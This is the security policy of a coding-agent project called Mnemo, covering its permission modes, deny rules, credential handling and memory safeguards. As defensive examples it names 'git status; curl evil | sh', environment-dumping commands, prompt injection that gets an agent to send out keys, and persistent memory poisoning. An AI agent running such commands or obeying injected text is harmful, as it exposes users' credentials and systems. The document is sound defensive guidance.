# Security

## Reporting a vulnerability

Please **do not open a public issue**. Use GitHub's private reporting:
**Security → Report a vulnerability** on this repository. Include what you
found, how to reproduce it, and what you think it affects. We aim to
answer within a week; a fix and a coordinated disclosure follow.

Mnemo is pre-1.0. Only the latest release is supported.

## What Mnemo is allowed to do (read this before you run it)

Mnemo is a coding agent: it reads your files, edits them and runs shell
commands as you. The model decides what to try; what stops it is the
permission gate (`/mode`).

| Mode | What happens |
|---|---|
| `default` | asks before every edit and every command that is not clearly read-only |
| `accept-edits` | edits project files freely, still asks before commands |
| `plan` | read-only: nothing is changed |
| `yolo` | asks for nothing. Only deny rules in `permissions.json` still hold |

Switch with `shift+tab`, `/mode`, `/accept-edits` or `/yolo` (each toggles), or start
in one with `--accept-edits`, `--plan` or `--yolo`. Only you can change the mode:
it is never a tool the model can call.

**The gate filters what runs; it is not a sandbox.** It stops the agent from
running things you did not approve, but anything you approve runs with your
permissions. In headless mode (`mnemo -p`) there is nobody to ask, so every
call that would ask is **allowed**: it behaves like `yolo`, and only `deny`
rules still apply. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
in a place you can afford to lose: a container, a throwaway checkout.

### What the gate is, and is not

- **`deny` rules are a filter, best effort.** A rule such as `env*` is tested
  against every command in a line, looking through spacing, `VAR=x` prefixes,
  directories, `sudo`/`env` wrappers and `sh -c '…'`, and a deny beats every mode and
  every `allow`. It does not understand every way to say the same thing
  (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
  first), and it does not reach into the Python tool (`ipy_run`). Deny what you
  mind, not just one spelling of it, and use `default` mode when it matters.
- **`allow` rules and "always" grants end on a word and never cover a compound
  command.** `git status*` does not cover `git status; curl evil | sh`, and an
  approval of `rm -rf dist` covers exactly that command.
- **`accept-edits` means edits inside this project.** Paths are resolved the way the
  tools resolve them (`~`, `@`, `file://`, symlinks). `.git`, `.pi`, `.agents`,
  `.mnemo`, `.github` and similar still ask, because what is written there runs
  later. Skills are always asked about.
- **Reads are free, except credentials.** `read`, `grep`, `find` and `ls` never ask,
  but refuse Mnemo's own `auth.json`, `~/.ssh`, `~/.aws` and `~/.gnupg`. A shell
  command can still `cat` them if you approve it.
- **A folder's own `.pi/` extensions, settings, prompts and skills run code and
  steer the model**, so Mnemo loads them only for a folder you have trusted: it asks
  once at start-up (`a` remembers it), headless runs skip them unless you pass
  `--trust-project`. Do not trust a repository you have not read.
- A `permissions.json` that exists but cannot be parsed stops all edits and
  commands until it is fixed, rather than quietly dropping your deny rules.

## What leaves your machine

- **Your prompts, the files and command output the model reads, and your
  memory's recalled facts go to the model provider you configured.** That is
  how an agent works. Choose the provider accordingly.
- **Nothing else.** Mnemo has no telemetry and no update checks. We measured
  it: `--version`, `doctor`, `--demo` and `memory status` open no network
  connection at all; only a real prompt does, and only to your provider.
- Memory is stored locally under `$MNEMO_HOME` (default `~/.mnemo`) in a
  journal file, readable only by you. It is never uploaded by Mnemo. **One
  exception, opt in:** if `OPENROUTER_API_KEY` is set, the text of memories is
  sent to OpenRouter to compute embeddings. Leave it unset and nothing is sent;
  search then uses a local hashing embedder. The embedding address must be
  `https://` (or local), and is read from the real environment or
  `$MNEMO_HOME/.env`, never from the folder you are working in.

## Credentials

- Keys you add with `/login` are stored by pi in `$MNEMO_HOME/agent/auth.json`
  with mode `0600`.
- **Mnemo also uses credentials it finds in your environment** (for example
  `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_*`, `OPENCODE_API_KEY`) and may
  choose that provider by default. If you do not want that, unset them for
  the session.
- **Commands the agent runs inherit your environment, including those keys.**
  A prompt injection (text in a file, a web page or a tool result that tells
  the model what to do) can therefore try to read or send them, for example
  with `env`. This is a known limitation, not a solved problem. Mitigations
  today: leave the mode on `default` so commands need your approval, use a
  provider key with a spend limit and no other access, and put `deny` rules
  for `env`, `printenv` and `curl`/`wget` to unknown hosts in
  `permissions.json`. Scrubbing provider keys from child processes is on the
  roadmap.
- Memory writes and session ingestion are redacted for common credential
  shapes (`sk-…`, `ghp_…`, `AKIA…`, private keys, and similar) before they are
  stored. Redaction is pattern-based and best effort: do not rely on it. Eval
results are scrubbed the same way, plus the exact value of every secret-named
environment variable.

## Memory is input the model trusts

What Mnemo remembers is shown to the model in later sessions, so a poisoned
memory is a prompt injection that persists. Facts that look like
instructions to steer, exfiltrate or hide are refused at write time
(`packages/memory/src/safety.ts`), recalled items are labelled as candidates
rather than facts, `/memory` and the memory map show what it holds and
`/forget` retires a fact. The scanner reads text the way a person would (width
forms, lookalike letters, invisible characters, line breaks) and also covers the
session record, but it is a list of patterns: a paraphrase can get past it, which
is why a recorded fix is shown to the model as a note and not an order, and why a
fact is a single line. This is a defence in depth, not a guarantee.

Two things to know when other agents share the memory: a project's identity comes
from its git `origin` (a repository that copies another's remote URL shares its
memory), and the MCP server takes the project from each call, so a model that is
prompt-injected can ask for another project's memory. Only attach memory to agents
and repositories you trust with all of it.

## The legacy stack

`agent/`, `harness-engine/` and `tui-go/` (the previous implementation) are not on
`main`. They remain on the `legacy` branch for reference and are **not maintained**.
They predate several of the protections above: a repository's own
`.mnemo/permissions.json` and hooks can run code when opened, and the agent does not
ask before acting unless the Go interface starts it. Do not run that code, least of all
on a repository you do not trust. Use `mnemo`. Reports about the `legacy` branch are
welcome but will not be fixed.

## Verifying a download

Each release ships `SHA256SUMS`; the install scripts check it before
installing. Release archives are built by GitHub Actions from the tagged
commit and carry a build-provenance attestation:

    gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo \
      --source-ref refs/tags/v0.1.0

The checksum catches a corrupted download, not a compromised release (it is
published beside the archive); the attestation is the provenance check.
